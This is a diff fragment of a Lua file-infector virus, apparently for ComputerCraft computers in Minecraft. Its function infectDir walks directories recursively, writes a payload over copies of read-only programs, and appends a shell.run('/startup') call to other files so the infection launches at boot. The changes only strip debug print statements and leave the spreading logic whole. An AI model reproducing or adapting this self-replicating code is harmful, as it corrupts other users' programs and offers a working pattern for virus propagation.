@@ -50,17 +50,13 @@ function infectDir(dirName, payload)
     isIgnored = false
     for _,ign in ipairs(ignoredFiles) do
       if file == ign then
-        print("IGN: " .. ign)
-        print("INN: " .. file)
         isIgnored = true
       end
-      print(isIgnored)
     end
     if not isIgnored then    
       fullFile = dirName .. "/" .. file
       if fs.isDir(fullFile) then
         infectDir(fullFile, payload)
-        --print("DIR: " .. fullFile)
       elseif fs.isReadOnly(fullFile) then
         if file ~= "startup" then
           dump = 'shell.run("' .. fullFile .. '")\n'
@@ -69,20 +65,15 @@ function infectDir(dirName, payload)
           dump = payload
         end
         
-        print(dump)
-        
-        print(file)
         output = fs.open("/" .. file, "w")
         output.write(dump)
         output.close()
      
       elseif fullFile == "/" .. shell.getRunningProgram() then
-        --print("THS: " .. fullFile)
-   
+        
       else
         output = fs.open(fullFile, "a")
         output.write('shell.run("/startup")')
-        --print("INF: " .. fullFile)
       end
     end
   end  
